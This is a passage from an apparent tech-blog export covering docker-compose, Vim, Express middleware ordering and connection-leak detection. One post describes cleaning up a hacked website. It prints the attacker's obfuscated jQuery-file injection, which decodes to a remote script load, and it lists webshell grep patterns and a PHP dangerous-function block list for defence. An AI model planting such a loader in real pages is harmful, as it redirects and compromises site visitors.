<p>  格式为 <code>docker-compose up [options] [SERVICE...]</code>。</p>
<p>  该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。</p>
<p>  链接的服务都将会被自动启动，除非已经处于运行状态。</p>
<p>  可以说，大部分时候都可以直接通过该命令来启动一个项目。</p>
<p>  默认情况，<code>docker-compose up</code> 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。</p>
<p>  当通过 <code>Ctrl-C</code> 停止命令时，所有容器将会停止。</p>
<p>  如果使用 <code>docker-compose up -d</code>，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。</p>
<p>  默认情况，如果服务容器已经存在，<code>docker-compose up</code> 将会尝试停止容器，然后重新创建（保持使用 <code>volumes-from</code> 挂载的卷），以保证新启动的服务匹配 <code>docker-compose.yml</code> 文件的最新内容。如果用户不希望容器被停止并重新创建，可以使用 <code>docker-compose up --no-recreate</code>。这样将只会启动处于停止状态的容器，而忽略已经运行的服务。如果用户只想重新部署某个服务，可以使用 <code>docker-compose up --no-deps -d &lt;SERVICE_NAME&gt;</code> 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。</p>
<p>  选项：</p>
<ul>
<li><code>-d</code> 在后台运行服务容器。</li>
<li><code>--no-color</code> 不使用颜色来区分不同的服务的控制台输出。</li>
<li><code>--no-deps</code> 不启动服务所链接的容器。</li>
<li><code>--force-recreate</code> 强制重新创建容器，不能与 <code>--no-recreate</code> 同时使用。</li>
<li><code>--no-recreate</code> 如果容器已经存在了，则不重新创建，不能与 <code>--force-recreate</code> 同时使用。</li>
<li><code>--no-build</code> 不自动构建缺失的服务镜像。</li>
<li><code>-t, --timeout TIMEOUT</code> 停止容器时候的超时（默认为 10 秒）。<br>​</li>
</ul>
</li>
<li><p><code>version</code></p>
<p>  格式为 <code>docker-compose version</code>。</p>
<p>  打印版本信息。</p>
</li>
</ul>
<p>更多关于 docker-compose 的使用请参考<a href="https://docs.docker.com/compose/">官方文档</a>。</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>《Vim 实用技巧》读书笔记（第二部分）</title>
    <url>/experience/practice/linux-reading-note-of-practical-vim-II/</url>
    <content><![CDATA[<p>本文接上一篇文章，本章节主要记录《Vim 适用技巧》第二部分文件相关操作的学习笔记。</p>
<span id="more"></span>

<ol>
<li><p>缓冲区、缓冲区列表<br>缓冲区是文件在内存中的映射，Vim 编辑的是缓冲区的内容，在使用 :wirte 等命令时将缓冲区的内容写入文件中。Vim 允许一次打开多个文件，这些文件的缓冲区形成了 Vim 的缓冲区列表，:ls 查看缓冲区列表，结果中 % 表示当前可视缓冲区，# 代表轮换文件，使用 &lt;C-^&gt;可以快速在缓冲区列表中切换。使用 :bnext 和 :bprev 在缓冲区列表中切换，:bfirst，:blast 等命令顾名思义既可。使用 :ls 显示的缓冲区列表中有一个编号和名字，可以凭借 :buffer {number} 或 :buffer {name} 直接精确跳转。:bdelete<br>{number} 可以删除指定的缓冲区，如果缓冲区内容修改后没有保存到文件中则会有保存或者放弃的提示。</p>
</li>
<li><p>参数列表<br>:args 显示缓冲区列表</p>
</li>
<li><p>工作区切分成窗口<br><C-w>s 水平切分，等效区 :split<br><C-w>v 垂直切分，等效区 :vsplit<br><C-w>{h|j|k|l} 对切换活动窗口，如 <C-w>j 代表切换到下面的窗口<br>使用 :only 关闭处活动窗口以外其他窗口，:close 或 :q 关闭活动窗口</p>
</li>
<li><p>标签页<br>标签页可以理解为容纳一系列窗口的容器。<br>:tabedit [filename] 在新标签中打开文件<br>:tabclose 关闭当前标签页<br>gt 切换到下一个标签页 等效与 :tabn<br>gT 切换到上一个标签页 等效与 :tabp<br>tabmove 移动标签页</p>
</li>
<li><p>使用 netwr 管理文件和目录<br>:edit . 等效于 :e. 打开文件管理器,并显示当前工作目录<br>:Explore 等效与 :E 打开文件管理器,并显示活动缓冲区所在的目录<br>:Vexplore 垂直分割窗口并显示缓冲区所在的目录<br>:Sexplore 水平分割窗口并显示缓冲区所在的目录<br>:netrw-d 创建目录<br>:netrw-rename 重命名<br>:netrw-del 删除<br>当 edit {path&#x2F;file} 目录不存在时，我们试图把缓冲区写入磁盘 时,Vim 会显示一条出错信息。在这种情况下,我们可以调用外部的 mkdir 程序 对此做出补救:</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:! mkdir -p %:h</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>使用普通用户读取 root 用户文件强制保存的方法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:w !sudo tee % &gt; /dev/null</span><br><span class="line">解释：</span><br><span class="line">  :w !&#123;cmd&#125; 缓冲区的内容作为 shell 命令的标准输入</span><br><span class="line">  sudo tee [buffer] /path/filename &gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>未完待续……</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB 安全实战</title>
    <url>/experience/practice/linux-web-security/</url>
    <content><![CDATA[<p>这几天网站被黑客盯上了，因为安全做得不好，被黑客攻击了好几次。常见的 WEB 攻击包括 XSS 攻击、SQL 注入、DDOS、CRFS 等，为了提高网站安全性能，最近特意对网站做了安全维护，属予作文以记之。</p>
<span id="more"></span>

<h2 id="攻击记录"><a href="#攻击记录" class="headerlink" title="攻击记录"></a>攻击记录</h2><ul>
<li>有一次黑客在首页引入的 jQuery-1.8.0.js 中写入一行 js 代码,</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var str=&quot;cnbtldms-vqhsd &#x27;!;rbqhos rqb&lt;[!gsso9..vvv-  fnnfkd`crk-bnl.robncd.iptdqx-</span><br><span class="line">ir[!=;.rbqhos=!(:&quot;;</span><br><span class="line">var length=str.length;var ba64=&quot;&quot;;for(i=0;i&lt;length;i++)&#123;var</span><br><span class="line">s=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)&#125;eval(ba64);</span><br></pre></td></tr></table></figure>

<pre><code>翻译后是

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.write (&quot;\&lt;script src=&quot;http://www.googleadsl.com/spcode/jquery.js&quot;&gt;&lt;/script&gt;&quot;)</span><br></pre></td></tr></table></figure>
导致的结果是打开网站几秒后跳转到一个色情页面，页面太美，不忍直视。
</code></pre>
<ul>
<li><p>还有一次是文件内容被篡改。被攻击那天早上打开一个页面的时候突然发现服务器 500 异常，然后登陆服务器查看站点目录， <code>stat filename</code> 发现站点下有一个目录下的所有文件均在该日凌晨 5:16 分左右被修改。打开内容一看，画面惨不忍睹。</p>
<p>  <img src="/images/20170910/error.jpg"></p>
</li>
<li><p>在有一次就是黑客上传文件到特定目录下</p>
</li>
</ul>
<h2 id="木马查杀"><a href="#木马查杀" class="headerlink" title="木马查杀"></a>木马查杀</h2><ul>
<li>快速木马查找命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -r --include=*.php &#x27;[^a-z]eval($_POST&#x27; /var/www/html/</span><br><span class="line">grep -r --include=*.php &#x27;[^a-z]eval($_&#x27; /var/www</span><br><span class="line">grep -r --include=*.php &#x27;file_put_contents(.*$_POST\[.*\]);&#x27; /var/www/html/</span><br></pre></td></tr></table></figure>
<ul>
<li>利用find mtime查找最近两天或者发现木马的这几天，有哪些PHP文件被修改</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find -mtime -2 -type f -name \*.php</span><br></pre></td></tr></table></figure>

<h2 id="PHP-安全防范"><a href="#PHP-安全防范" class="headerlink" title="PHP 安全防范"></a>PHP 安全防范</h2><ul>
<li><p>确保运行 PHP 的用户为一般用户，如 www</p>
</li>
<li><p>禁用 PHP 危险函数</p>
<p>  <img src="/images/20170910/phpeval.png"></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disable_functions = passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,</span><br><span class="line">ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,phpinfo #禁用的函数</span><br><span class="line">expose_php = off  #避信免暴露PHP息</span><br><span class="line">display_errors = off</span><br><span class="line">enable_dl = off</span><br><span class="line">allow_url_include = off</span><br><span class="line">session.cookie_httponly = 1</span><br><span class="line">upload_tmp_dir = /tmp</span><br></pre></td></tr></table></figure>

<ul>
<li>改变 PHP 文件的权限：644</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 644 -R ./</span><br><span class="line">find ./ -type d -print|xargs chmod 755;</span><br><span class="line">chown -R apache:apache ./</span><br></pre></td></tr></table></figure>
<ul>
<li>关闭上传目录的 PHP 执行权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;/home/www/upload/&quot;&gt;</span><br><span class="line">    php_flag engine off             # 关闭 PHP 执行引擎</span><br><span class="line">    &lt;filesmatch &quot;(.*)php&quot;&gt;          # 匹配以 PHP 结尾的文件，设置权限</span><br><span class="line">        Order deny,allow</span><br><span class="line">        Deny from all               # 全部不解析</span><br><span class="line">        Allow from localhost    # 允许例外：</span><br><span class="line">        Allow from 127.0.0.1        # 允许的例外</span><br><span class="line">    &lt;/filesmatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Apache-安全"><a href="#Apache-安全" class="headerlink" title="Apache 安全"></a>Apache 安全</h2><ul>
<li>更改 Apache 的用户为一般用户，如 apache，注意存放数据目录权限为 apache</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure>
<ul>
<li>禁用 -Indexes</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Options -Indexes FollowSymLinks</span><br></pre></td></tr></table></figure>
<pre><code>如果目录下没有 index.* 文件则 403 错误而不是列出目录下的文件。
</code></pre>
<ul>
<li><p>启用 mod_security 模块防止 SQL 注入<br>  安装：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install mod_security</span><br></pre></td></tr></table></figure>

<p>  httpd.conf 中引入 mod_security.conf</p>
</li>
<li><p>设置 HTTP 头信息防止 XSS 攻击</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_headers.c&gt;</span><br><span class="line">Header set X-XSS-Protection &quot;1; mode=block&quot;</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>mod_evasive20 防止 DDOS 攻击</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.linuxeye.cn/351.html">https://blog.linuxeye.cn/351.html</a></li>
<li><a href="https://www.howtoforge.com/apache_mod_security">https://www.howtoforge.com/apache_mod_security</a></li>
<li><a href="https://serverfault.com/questions/604746/mod-security-another-rule-with-same-id">https://serverfault.com/questions/604746/mod-security-another-rule-with-same-id</a></li>
</ul>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Best Practices for Express Middleware Management</title>
    <url>/experience/practice/middleware-installation-in-practice/</url>
    <content><![CDATA[<p>When structuring Express apps, middleware play a crucial role in handling cross-cutting concerns like logging, security, and error handling. However, as our middleware chain grows, managing the installation order can quickly become messy. In this post, I’ll go over a few patterns for installing Express middleware - from simple to more advanced - and discuss the pros and cons of each approach. The goal is to provide some ideas and best practices to keep our middleware pipeline maintainable as our app grows.</p>
<span id="more"></span>

<h2 id="Practice-1-Installing-Middleware-Sequentially"><a href="#Practice-1-Installing-Middleware-Sequentially" class="headerlink" title="Practice 1: Installing Middleware Sequentially"></a>Practice 1: Installing Middleware Sequentially</h2><p>This approach installs middleware by specifying each one sequentially in code:</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(routes);</span><br></pre></td></tr></table></figure>

<p>This loads the middleware in a predefined order, which works for simple use cases.</p>
<p>However, this approach has some downsides:</p>
<ul>
<li>The middleware loading order is inflexible. Dependencies between middleware aren’t handled automatically.</li>
<li>It makes it harder to share middleware configuration across projects.</li>
<li>There’s no central place to see what middleware is in use.</li>
<li>It doesn’t facilitate configuration per environment.</li>
<li>Testing middleware in isolation is more difficult.</li>
</ul>
<h2 id="Practice-2-Installing-Middleware-by-Priority"><a href="#Practice-2-Installing-Middleware-by-Priority" class="headerlink" title="Practice 2: Installing Middleware by Priority"></a>Practice 2: Installing Middleware by Priority</h2><p>While installing middleware sequentially directly in code is simple, it can quickly become unmanageable for larger apps. To add more structure, we can define middleware priorities and install them in a sorted order based on those priorities. This allows us to control the middleware loading order more granularly.</p>
<p>This approach assigns a priority to each middleware and installs them sorted by priority:</p>
<ol>
<li><p>Define middleware priorities:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MiddlewarePriority</span> = &#123;</span><br><span class="line">  <span class="title class_">Logging</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="title class_">BodyParser</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="title class_">Helmet</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="title class_">ErrorHandler</span>: <span class="number">4</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Register middleware with priorities:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> middlewares = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line">middlewares.<span class="title function_">set</span>(<span class="title class_">MiddlewarePriority</span>.<span class="property">Logging</span>, loggingMiddleware);</span><br><span class="line">middlewares.<span class="title function_">set</span>(<span class="title class_">MiddlewarePriority</span>.<span class="property">BodyParser</span>, bodyParserMiddleware);</span><br><span class="line">middlewares.<span class="title function_">set</span>(<span class="title class_">MiddlewarePriority</span>.<span class="property">Helmet</span>, helmetMiddleware);</span><br><span class="line">middlewares.<span class="title function_">set</span>(<span class="title class_">MiddlewarePriority</span>.<span class="property">ErrorHandler</span>, errorHandlerMiddleware);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Install middleware in priority order:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">installMiddlewares</span>(<span class="params">middlewaresMap</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> sortedMiddlewares = [...middlewaresMap]</span><br><span class="line">    .<span class="title function_">sort</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a[<span class="number">0</span>] - b[<span class="number">0</span>])</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">m</span>) =&gt;</span> m[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  sortedMiddlewares.<span class="title function_">forEach</span>(<span class="function">(<span class="params">middleware</span>) =&gt;</span> &#123;</span><br><span class="line">    app.<span class="title function_">use</span>(middleware);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>Drawbacks:</p>
<ul>
<li>Hard to add new middleware between priorities (e.g. CORS after BodyParser). No unused priority values.</li>
<li>Priorities could become out of sync if new middleware added.</li>
<li>Still need to register middleware in code.</li>
</ul>
<h2 id="Practice-3-Topological-Sorting-for-Middleware-Ordering"><a href="#Practice-3-Topological-Sorting-for-Middleware-Ordering" class="headerlink" title="Practice 3: Topological Sorting for Middleware Ordering"></a>Practice 3: Topological Sorting for Middleware Ordering</h2><p>While defining middleware priorities allows more control over ordering than installling sequentially, it still has limitations when new middleware needs to be added between existing priorities. This leads us to a more flexible approach - modeling middleware as a directed graph based on before&#x2F;after dependencies and topologically sorting to resolve the order. This avoids priority conflicts altogether by letting us explicitly declare dependencies separately from the installation code. Now middleware can be added without worrying about priorities or order - the graph handles it automatically. Transitioning to this dependency graph approach allows our middleware configuration to be much more extensible.</p>
<p>This approach defines middleware dependencies and installs them in a valid order using topological sorting:</p>
<ol>
<li><p>Define middleware and dependencies:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> middlewares = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;logging&quot;</span>,</span><br><span class="line">    <span class="attr">before</span>: [],</span><br><span class="line">    <span class="attr">after</span>: [<span class="string">&quot;bodyParser&quot;</span>],</span><br><span class="line">    <span class="attr">mw</span>: loggingMiddleware,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;bodyParser&quot;</span>,</span><br><span class="line">    <span class="attr">before</span>: [<span class="string">&quot;logging&quot;</span>],</span><br><span class="line">    <span class="attr">after</span>: [<span class="string">&quot;helmet&quot;</span>],</span><br><span class="line">    <span class="attr">mw</span>: bodyParserMiddleware,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;helmet&quot;</span>,</span><br><span class="line">    <span class="attr">before</span>: [<span class="string">&quot;bodyParser&quot;</span>],</span><br><span class="line">    <span class="attr">after</span>: [<span class="string">&quot;routes&quot;</span>],</span><br><span class="line">    <span class="attr">mw</span>: helmetMiddleware,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
</li>
<li><p>Build dependency graph:</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getMw</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> middlewares.<span class="title function_">find</span>(<span class="function">(<span class="params">mw</span>) =&gt;</span> mw.<span class="property">id</span> === id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> depGraph = <span class="keyword">new</span> <span class="title class_">Graph</span>();</span><br><span class="line">middlewares.<span class="title function_">forEach</span>(<span class="function">(<span class="params">mw</span>) =&gt;</span> &#123;</span><br><span class="line">  depGraph.<span class="title function_">addVertex</span>(mw);</span><br><span class="line"></span><br><span class="line">  mw.<span class="property">after</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">afterId</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> afterMw = <span class="title function_">getMw</span>(afterId);</span><br><span class="line">    depGraph.<span class="title function_">addEdge</span>(afterMw, mw);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  mw.<span class="property">before</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">beforeId</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> beforeMw = <span class="title function_">getMw</span>(beforeId);</span><br><span class="line">    depGraph.<span class="title function_">addEdge</span>(mw, beforeMw);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Topologically sort graph and install middleware:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sortedMws = depGraph.<span class="title function_">topologicalSort</span>();</span><br><span class="line"></span><br><span class="line">sortedMws.<span class="title function_">forEach</span>(<span class="function">(<span class="params">mw</span>) =&gt;</span> &#123;</span><br><span class="line">  app.<span class="title function_">use</span>(mw.<span class="property">middleware</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>This allows complete control over middleware ordering while avoiding priority conflicts. Middleware and dependencies are declared separately from app code.</p>
<p>The key is implementing the <code>Graph</code> class with <code>addVertex</code>, <code>addEdge</code> and <code>topologicalSort</code> methods.</p>
<p>There is an example of the directed graph implementation for the reference:</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IVertex</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">  <span class="attr">vertices</span>: <span class="title class_">IVertex</span>[];</span><br><span class="line">  <span class="attr">adjList</span>: <span class="title class_">Map</span>&lt;<span class="title class_">IVertex</span>, <span class="title class_">IVertex</span>[]&gt;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">vertices</span> = [];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">adjList</span> = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">addVertex</span>(<span class="attr">v</span>: <span class="title class_">IVertex</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">vertices</span>.<span class="title function_">push</span>(v);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">adjList</span>.<span class="title function_">set</span>(v, []);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">addEdge</span>(<span class="attr">v</span>: <span class="title class_">IVertex</span>, <span class="attr">w</span>: <span class="title class_">IVertex</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">adjList</span>.<span class="title function_">get</span>(v)!.<span class="title function_">push</span>(w);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">topologicalSort</span>(): <span class="title class_">IVertex</span>[] &#123;</span><br><span class="line">    <span class="keyword">const</span> visited = <span class="keyword">new</span> <span class="title class_">Set</span>&lt;<span class="title class_">IVertex</span>&gt;();</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">stack</span>: <span class="title class_">IVertex</span>[] = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> v <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">vertices</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!visited.<span class="title function_">has</span>(v)) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">dfs</span>(v, visited, stack);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> stack.<span class="title function_">reverse</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">dfs</span>(<span class="params"><span class="attr">v</span>: <span class="title class_">IVertex</span>, <span class="attr">visited</span>: <span class="title class_">Set</span>&lt;<span class="title class_">IVertex</span>&gt;, <span class="attr">stack</span>: <span class="title class_">IVertex</span>[]</span>) &#123;</span><br><span class="line">    visited.<span class="title function_">add</span>(v);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> neighbors = <span class="variable language_">this</span>.<span class="property">adjList</span>.<span class="title function_">get</span>(v)!;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> w <span class="keyword">of</span> neighbors) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!visited.<span class="title function_">has</span>(w)) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">dfs</span>(w, visited, stack);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stack.<span class="title function_">push</span>(v);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>In summary, there are a few different ways to handle middleware installation. Doing it directly in code is quick but can get messy. Defining priorities helps control order but still has conflicts. Modeling dependencies as a graph and topology sorting gives the most flexibility as apps grow larger. The key is separating the middleware declarations from the installation logic. This allows new middleware to be added without fussing with order. Hope this gives some ideas on managing middleware setup!</p>
]]></content>
      <categories>
        <category>Experience</category>
        <category>Practice</category>
      </categories>
      <tags>
        <tag>Graph</tag>
        <tag>Middleware</tag>
      </tags>
  </entry>
  <entry>
    <title>Troubleshooting in Practice - connection leak detection as an example</title>
    <url>/experience/practice/troubleshooting-in-practice/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>As of the writing time, I have been working for over five years. In recent years, with the gradual accumulation of work experience, more and more colleagues and peers have approached me for help in solving challenging problems, such as Node.js memory leak detection, database connection pool leak detection (where connections are held for a long period), performance optimization, deadlock detection, among others. Today, I will use database connection pool leak detection as an example to summarize a set of approaches for troubleshooting complex issues for future reference - my best practices to troubleshooting.</p>
<p>Overall, my approach to analyzing complex issues can be broken down into eight steps.<br><img src="/images/2023-10/troubleshooting-process.png"></p>
<span id="more"></span>

<h2 id="Step-1-Define-Problem"><a href="#Step-1-Define-Problem" class="headerlink" title="Step 1: Define Problem"></a>Step 1: Define Problem</h2><p>The first and most crucial step in troubleshooting is to precisely define the problem. Start by gathering information about the issue. In the case of connection leak detection,</p>
<p><strong>The response was very slow, even with no response from Gateway but a 503 HTTP status code was responded.</strong></p>
<p>This is the definition of our problem which is very straightforward.</p>
<h2 id="Step-2-Gather-Information"><a href="#Step-2-Gather-Information" class="headerlink" title="Step 2: Gather Information"></a>Step 2: Gather Information</h2><p>The low response comes from kinds of possibilities. No hurry to investigate it immediately. Instead, to understand the problem better, we should collect as much information as possible. This may include environment, code version, logs, error messages, etc.</p>
<p>In our scenario, we found there was an endpoint &#x2F;metrics timeout from the logs. There wasn’t further information except for db connection failed to acquire.<br><img src="/images/2023-10/log1.png" alt="log1"></p>
<p>That means db connection pool was full always. We suspected some connections never had been released after used. We developed a detection algorithm in order to gather more logs about connection leak as below:</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> connectionMap = <span class="keyword">new</span> <span class="title class_">WeakMap</span>&lt;<span class="title class_">Connection</span>, <span class="title class_">IConInfo</span>&gt;();</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">registerForLeaks</span>(<span class="params">label: string, con: Connection, stackErr?: <span class="built_in">Error</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (connectionMap.<span class="title function_">has</span>(con)) &#123; <span class="comment">// already register</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">info</span>: <span class="title class_">IConInfo</span> = &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="title function_">uuid</span>(),</span><br><span class="line">        stackErr,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Error</span>.<span class="title function_">captureStackTrace</span>(info, registerForLeaks); <span class="comment">// capture stack excluding current function</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">warnAfterUnusedMs</span>: number = (process.<span class="property">env</span>.<span class="property">DB_LEAK_WARN_AFTER_UNUSED</span> &amp;&amp; <span class="built_in">parseInt</span>(process.<span class="property">env</span>.<span class="property">DB_LEAK_WARN_AFTER_UNUSED</span>, <span class="number">10</span>)) || <span class="title class_">TimeUnit</span>.<span class="property">MINUTES</span>.<span class="title function_">toMillis</span>(<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">intervalMs</span>: number = (process.<span class="property">env</span>.<span class="property">DB_LEAK_INTERVAL_CHECK</span> &amp;&amp; <span class="built_in">parseInt</span>(process.<span class="property">env</span>.<span class="property">DB_LEAK_INTERVAL_CHECK</span>, <span class="number">10</span>)) || <span class="title class_">TimeUnit</span>.<span class="property">MINUTES</span>.<span class="title function_">toMillis</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">const</span> interval = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!connectionMap.<span class="title function_">has</span>(con)) &#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> unusedSinceMs = <span class="title class_">Date</span>.<span class="title function_">now</span>() - (info.<span class="property">lastUsedTimeStamp</span> || info.<span class="property">connectionTimestamp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove check after leak detection</span></span><br><span class="line">        <span class="keyword">if</span> (unusedSinceMs &gt; warnAfterUnusedMs) &#123;</span><br><span class="line">            <span class="title function_">logError</span>(</span><br><span class="line">                <span class="string">`[<span class="subst">$&#123;label&#125;</span>] probable connection leak detected with connection id: <span class="subst">$&#123;info.id&#125;</span>, unused since <span class="subst">$&#123;TimeUnit.MILLISECONDS.toMinutes(unusedSinceMs)&#125;</span> mins`</span>,</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">clearInterval</span>(interval);</span><br><span class="line">            map.<span class="title function_">delete</span>(con);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, intervalMs);</span><br><span class="line"></span><br><span class="line">    connectionMap.<span class="title function_">set</span>(con, info);</span><br><span class="line"></span><br><span class="line">    con.<span class="title 